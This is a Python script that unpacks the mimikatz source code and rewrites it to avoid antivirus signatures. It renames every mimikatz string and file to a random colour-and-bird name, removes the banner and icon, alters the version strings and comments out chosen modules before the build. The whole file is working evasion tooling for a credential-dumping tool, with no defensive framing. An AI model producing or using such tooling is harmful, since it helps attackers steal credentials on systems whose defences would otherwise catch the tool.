import zipfile, os, random, glob

# Global var for list of files
files=[]

def unzip():
    zip_ref = zipfile.ZipFile("./mimikatz-source.zip", 'r')
    zip_ref.extractall("./mimikatz")
    zip_ref.close()

def generateNewName():
    colours = open('colours', 'r').readlines()
    birds = open('birds', 'r').readlines()
    name = colours[random.randrange(len(colours))][:-1]+birds[random.randrange(len(birds))][:-1]
    print(' [*] New name generated: '+name)
    return name

def replace(file, name):
    new = []
    with open(file, 'r') as orig:
        i=0
        lines = orig.readlines()
        while i < len(lines):
            if 'mimikatz' in lines[i]:
                lines[i] = lines[i].replace("mimikatz", name.lower())
            if 'MIMIKATZ' in lines[i]:
                lines[i] = lines[i].replace("MIMIKATZ", name.upper())
            i += 1
        new = lines
    open(file, 'w').writelines(new)

def removeCommonStrings(name):
    # Remove Banner
    lines = open('mimikatz/mimikatz/mimikatz.c', 'r').readlines()
    line = 74
    while line < 81:
        newLine = ('//' + lines[line])
        lines[line] = newLine
        line += 1
    open('mimikatz/mimikatz/mimikatz.c', 'w').writelines(lines)
    print(' [*] Banner removed')

    # Change static strings
    lines = open('mimikatz/inc/globals.h', 'r').readlines()
    lines[30] = u'\x23' + 'define MIMIKATZ				L"%s"\n' % (name.lower())
    lines[31] = u'\x23' + 'define MIMIKATZ_VERSION		L"%s"\n' % (str(random.randrange(50)))
    lines[32] = u'\x23' + 'define MIMIKATZ_CODENAME		L"%s"\n' % (name)
    open('mimikatz/inc/globals.h', 'w').writelines(lines)
    print(' [*] Static strings changed')

def getDirectory(directory):
    dir = glob.glob('./'+directory+'/*')
    if dir != []:
        for folder in dir:
            files.append(folder.split('/')[-1].replace('\\','/'))
            if 'lib' not in folder.split('/')[-1].replace('\\','/'):
                getDirectory(folder)

def changeName(name):
    getDirectory('./mimikatz/*')
    for item in files:
        if '.' in item:
            replace(item, name)

    os.rename('./mimikatz/mimikatz/mimikatz.c','./mimikatz/mimikatz/%s.c' % name)
    os.rename('./mimikatz/mimikatz/mimikatz.h','./mimikatz/mimikatz/%s.h' % name)
    os.rename('./mimikatz/mimikatz/mimikatz.rc','./mimikatz/mimikatz/%s.rc' % name)
    print(' [*] References to mimikatz amended')

def removeIcon():
    lines = open('mimikatz/mimikatz/mimikatz.rc', 'r').readlines()
    newLine = ('//' + lines[-1])
    lines[-1] = newLine
    open('mimikatz/mimikatz/mimikatz.rc', 'w').writelines(lines)
    print(' [*] Icon removed')

def removeModules(name):
    modules = {
        'busylight': False,
        'crypto': True,
        'cred': False,
        'dpapi': False,
        'event': False,
        'handle': True,
        'iis': False,
        'key': False,
		'exit': True,
        'kernel': True,
        'lsadump': True,
        'lsadump_remote': True,
        'minesweeper': False,
        'misc': False,
        'net': True,
        'patch': True,
        'privilege': True,
        'process': True,
        'remotelib': True,
        'rpc_bkrp': False,
        'service': True,
        'service_remote': True,
        'sid': False,
        'standard': False,
        'sysenv': False,
        'token': True,
        'ts': False,
        'vault': False
    }

    toRemove=[]
    for key, value in modules.iteritems():
        if value == False:
            toRemove.append(key)

    exceptions=['sekurlsa_dpapi', 'dpapi_oe']

    lines = open('mimikatz/mimikatz/mimikatz.c', 'r').readlines()
    line = 8
    while True:
        for item in toRemove:
            if item in exceptions:
                continue
            elif item in lines[line]:
                newLine = ('//' + lines[line])
                lines[line] = newLine
        line += 1
        if '};' in lines[line]:
            break
    open('mimikatz/mimikatz/mimikatz.c', 'w').writelines(lines)

    lines = open('mimikatz/mimikatz/mimikatz.h', 'r').readlines()
    line = 0
    while line < len(lines):
        for item in toRemove:
            if item in exceptions:
                continue
            elif item in lines[line]:
                newLine = ('//' + lines[line])
                lines[line] = newLine
        line += 1
    open('mimikatz/mimikatz/mimikatz.h', 'w').writelines(lines)

    lines = open('mimikatz/mimikatz/mimikatz.vcxproj', 'r').readlines()
    line = 0
    while line < len(lines):
        for item in toRemove:
            if (lines[line].split('\\')[-1].split('.')[0][7:] in exceptions):
                continue
            elif ('\\'+item+'\\' in lines[line]) or (item+'.c' in lines[line]) or (item+'.h' in lines[line]):
                newLine = ('<!--' + lines[line] + '-->')
                lines[line] = newLine
        line += 1
    open('mimikatz/mimikatz/mimikatz.vcxproj', 'w').writelines(lines)

    lines = open('mimikatz/mimikatz/mimikatz.vcxproj.filters', 'r').readlines()
    line = 0
    while line < len(lines):
        for item in toRemove:
            if (lines[line].split('\\')[-1].split('.')[0][7:] in exceptions):
                continue
            elif (item+'.c' in lines[line]) or (item+'.h' in lines[line]):
                newLine = ('<!--' + lines[line])
                newTrailer = (lines[line+2] + '-->')
                lines[line] = newLine
                lines[line+2] = newTrailer
        line += 1
    open('mimikatz/mimikatz/mimikatz.vcxproj.filters', 'w').writelines(lines)

    print(' [*] Modules removed')

def run():
    unzip()
    # Generate a new name
    name = generateNewName()
    # Remove banner and static strings
    removeCommonStrings(name)
    # Remove Icon
    removeIcon()
    # Remove modules
    removeModules(name)
    # Get entire directory, rename "mimikatz" and "MIMIKATZ" in *.* files
    changeName(name)
    return name

if __name__=='__main__':
    run()
    print(' [*] mimikatz is ready to be built!')
